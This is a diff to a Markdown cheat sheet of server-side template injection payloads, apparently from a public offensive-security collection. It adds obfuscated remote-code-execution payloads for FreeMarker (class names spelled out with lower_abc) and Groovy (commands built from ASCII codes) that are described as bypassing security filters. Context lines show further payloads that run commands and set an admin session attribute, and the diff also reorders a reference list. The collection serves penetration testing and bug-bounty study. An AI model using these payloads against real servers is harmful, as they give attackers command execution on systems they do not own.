@@ -12,6 +12,7 @@
     - [Freemarker - Basic Injection](#freemarker---basic-injection)
     - [Freemarker - Read File](#freemarker---read-file)
     - [Freemarker - Code Execution](#freemarker---code-execution)
+    - [Freemarker - Code Execution with Obfuscation](#freemarker---code-execution-with-obfuscation)
     - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
 - [Jinjava](#jinjava)
     - [Jinjava - Basic Injection](#jinjava---basic-injection)
@@ -25,6 +26,7 @@
     - [Groovy - Read File](#groovy---read-file)
     - [Groovy - HTTP Request:](#groovy---http-request)
     - [Groovy - Command Execution](#groovy---command-execution)
+    - [Groovy - Command Execution with Obfuscation](#groovy---command-execution-with-obfuscation)
     - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
 - [Spring Expression Language](#spring-expression-language)
     - [SpEL - Basic Injection](#spel---basic-injection)
@@ -111,6 +113,20 @@ ${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Bas
 ${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
 ${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
 ```
+
+### Freemarker - Code Execution with Obfuscation
+
+FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):
+
+If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.
+
+Chaining `lower_abc` to perform code execution (command: `id`):
+
+```js
+${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ### Freemarker - Sandbox Bypass
 
@@ -312,6 +328,20 @@ ${this.evaluate("9*9") //(this is a Script class)}
 ${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
 ```
 
+### Groovy - Command Execution with Obfuscation
+
+You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.
+
+Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.
+
+Execute system command (command: `id`):
+
+```groovy
+${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
+```
+
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+
 ### Groovy - Sandbox Bypass
 
 ```groovy
@@ -413,16 +443,17 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 
 ## References
 
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 - [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
 - [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
 - [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
 - [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
 - [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
 - [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
+- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
+- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
